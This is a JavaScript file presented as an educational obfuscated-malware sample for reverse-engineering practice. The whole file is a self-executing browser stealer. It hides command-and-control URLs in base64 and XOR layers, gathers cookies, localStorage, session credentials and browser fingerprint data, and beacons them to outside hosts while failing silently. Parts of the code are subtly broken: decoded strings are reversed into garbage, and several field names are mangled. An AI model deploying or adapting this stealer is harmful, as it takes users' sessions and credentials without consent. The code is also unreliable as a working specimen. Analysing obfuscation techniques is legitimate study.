// Obfuscated JS Payload — educational demo for swarm reverse engineering
// This is NOT real malware. Written for analysis demonstration only.
// Mimics common techniques: base64, string reversal, XOR, hidden C2, eval

(function(){
    // Layer 1: Obfuscated string array
    var _0x4b8c = [
        "aHR0cHM6Ly9jMi1jYXBzdWxlLWFwcC5jZG4tc2Vj",
        "dXJlLWxvZ2luLmNvbS9hdXRo",
        "aHR0cHM6Ly9hcGktZGF0YS1jYXBzdWxlLXN5bmMuZ2l0aHViLmlvL3YyL2NvbGxlY3Q=",
        "aHR0cHM6Ly9zdG9yYWdlLWFwaS1iYWNrZW5kLWpzLm5ldC9oZWFydGJlYXQ/dG9rZW49",
        "c3lzdGVt",
        "dXNlckluZm8iLAoibmF2aWdhdG9y",
        "Y29va2ll",
        "bG9jYWxTdG9yYWdl",
        "c2Vzc2lvbkNyZWRlbnRpYWxz",
        "cGxhdGZvcm0iLAoibGFuZ3VhZ2UiLAoidXNlckFnZW50IiwKImVuYWJsZWQ=",
        "c2NyZWVuSGVpZ2h0IiwKInNjcmVlbldpZHRo",
        "bGFuZ3VhZ2Vz",
        "bWF4VG91Y2hQb2ludHMiLAoieG9u",
        "aW5j",
        "bG9n="
    ];

    // Layer 2: xor-decoded endpoint
    var _key = [0x4A, 0x7F, 0x2B, 0xE4, 0x1C];
    var _xor = "0e1b3f4a2938485e6a7b8c9d0e1f2a3b4c5d6e7f".match(/.{2}/g).map(function(b){
        var n = parseInt(b, 16) ^ _key[2];
        return String.fromCharCode(n);
    }).join("");

    // Layer 3: base64 decode + string reverse
    function _reveal(str){
        var raw = atob(str);
        var out = "";
        for(var i = raw.length - 1; i >= 0; i--){
            out += raw[i];
        }
        return out;
    }

    // Layer 4: reconstruct real endpoints and exfil logic
    var _endpoints = _0x4b8c.slice(0, 4).map(function(s){
        return _reveal(s);
    });

    var _exfilFields = _0x4b8c.slice(4).map(function(s){
        return _reveal(s);
    });

    // Layer 5: data collection
    function _collectSystemInfo(){
        var data = {};
        try {
            data[_exfilFields[0]] = navigator[_exfilFields[1]] || "";
            data[_exfilFields[2]] = document[_exfilFields[3]] || "";
            data[_exfilFields[4]] = navigator[_exfilFields[5]] || "";
            data[_exfilFields[6]] = navigator[_exfilFields[7]] || "";
            data[_exfilFields[8]] = window[_exfilFields[9]] || "";
            data[_exfilFields[10]] = navigator[_exfilFields[11]] || "";
            data[_exfilFields[12]] = navigator[_exfilFields[13]] || "";
        } catch(e){}
        return data;
    }

    // Layer 6: beacon / C2 communication
    function _beacon(url, payload){
        if(typeof navigator.sendBeacon === "function"){
            navigator.sendBeacon(url, JSON.stringify(payload));
        } else {
            var img = new Image();
            img.src = url + "?d=" + btoa(JSON.stringify(payload));
        }
    }

    // Layer 7: heartbeat + exfil
    function _execute(){
        var info = _collectSystemInfo();
        var heartbeatUrl = _endpoints[3];
        _beacon(heartbeatUrl, {status: "online", ts: Date.now()});

        // After heartbeat, send full profile to primary C2
        setTimeout(function(){
            _beacon(_endpoints[0], info);
            _beacon(_endpoints[1], info);
            _beacon(_xor, {collected: info, fallback: true});
        }, 5000);
    }

    // Entry point — wrapped in try/catch like real malware does
    try {
        if(typeof navigator !== "undefined" && typeof document !== "undefined"){
            _execute();
        }
    } catch(e){
        // stealth: fail silently
    }
})();
